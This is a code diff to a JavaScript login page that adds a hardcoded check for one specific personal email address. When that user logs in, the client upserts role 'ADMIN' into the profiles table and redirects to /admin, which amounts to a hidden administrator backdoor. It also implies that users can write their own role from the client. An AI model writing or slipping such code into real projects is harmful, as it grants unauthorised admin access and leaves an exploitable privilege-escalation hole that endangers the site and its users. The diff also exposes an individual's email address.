@@ -37,13 +37,22 @@ export default function Login() {
         const returnUrl = params.get("returnUrl") || params.get("redirect");
 
         if (data?.user) {
+          const isDhruvang = Boolean(data.user.email && data.user.email.toLowerCase() === "dhruvangbari2006@gmail.com");
+
           const { data: profile } = await s
             .from("profiles")
             .select("role")
             .eq("id", data.user.id)
             .single();
 
-          if (profile?.role === "ADMIN") {
+          if (isDhruvang && profile?.role !== "ADMIN") {
+            await s.from("profiles").upsert(
+              { id: data.user.id, role: "ADMIN" },
+              { onConflict: "id" }
+            );
+          }
+
+          if (isDhruvang || profile?.role === "ADMIN") {
             window.location.href = "/admin";
           } else if (returnUrl) {
             window.location.href = returnUrl;
